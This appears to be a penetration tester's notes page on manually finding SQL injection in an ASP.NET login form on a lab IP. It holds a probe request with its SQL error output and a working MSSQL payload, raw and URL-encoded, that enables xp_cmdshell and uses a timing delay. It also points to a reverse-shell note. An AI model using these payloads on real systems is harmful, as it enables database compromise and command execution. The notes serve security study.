# Manual SQLi Enumeration

**Author:** Julien Bongars\
**Date:** 2026-03-07 16:09:18
**Path:**

---

## Web Enumeration

### Check

Add a single quotation to each field and see if there is an error.

```http
POST /login.aspx HTTP/1.1
Host: 192.168.179.50
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.179.50/login.aspx
Content-Type: application/x-www-form-urlencoded
Content-Length: 3165
Origin: http://192.168.179.50
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

...UsernameTextBox=%27&ctl00%24ContentPlaceHolder1%24PasswordTextBox=%27&ctl00%24ContentPlaceHolder1%24LoginButton=Login
```

```html
<form method="post" >
  <div class="d-flex mb-5 align-items-center">
    <label class="control control--checkbox mb-0"><span class="caption">Remember me</span>
      <input type="checkbox" checked="checked"/>
      <div class="control__indicator"></div>
    </label>
    <span class="ml-auto"><a href="#" class="forgot-pass">Forgot Password</a></span>
  </div>
  <input type="submit" name="ctl00$ContentPlaceHolder1$LoginButton" value="Login" id="ContentPlaceHolder1_LoginButton" class="btn btn-block btn-primary" />

  <span id="ContentPlaceHolder1_MyLabel">System.Data.SqlClient.SqlException (0x80131904): Unclosed quotation mark after the character string '';'.
    Incorrect syntax near '';'.
    at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction)
    at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose)
    at System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady)
    at System.Data.SqlClient.SqlDataReader.TryConsumeMetaData()
    at System.Data.SqlClient.SqlDataReader.get_MetaData()
    at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString, Boolean isInternal, Boolean forDescribeParameterEncryption, Boolean shouldCacheForAlwaysEncrypted)
    at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, Boolean inRetry, SqlDataReader ds, Boolean describeParameterEncryptionRequest)
    at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry)
    at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
    at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
    at System.Data.SqlClient.SqlCommand.ExecuteReader()
    at MyNamespace.MyClass.Login(Object sender, EventArgs e) in c:\inetpub\wwwroot\login.cs:line 37
    ClientConnectionId:1c297bfa-813a-4d5e-8a80-2c83ab9382d5
    Error Number:105,State:1,Class:15</span>
</form>
```

### Get columns

Use `ORDER BY n` to check the number of columns in response

### Blind Execution

We can use a delay to verify that a command is being executed

```sql
' EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1' ; RECONFIGURE ; WAITFOR DELAY '00:00:03' --
```

we use firefox -> developer tools ->

```js
copy(window.encodeURIComponent(` code goes here `));
```

to got the URI encoded body for query string if field does not allow for special characters

```bash
'%20EXEC%20sp_configure%20'show%20advanced%20options'%2C%20'1'%3B%20RECONFIGURE%3B%20EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%20%3B%20RECONFIGURE%20%3B%20WAITFOR%20DELAY%20'00%3A00%3A03'%20--
```

### Get reversre

../../infiltration/reverse-shell/sql.md

## Resources

- [sqlmap](https://sqlmap.org/) — automated follow-up when manual SQLi is confirmed
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) — payload lookup
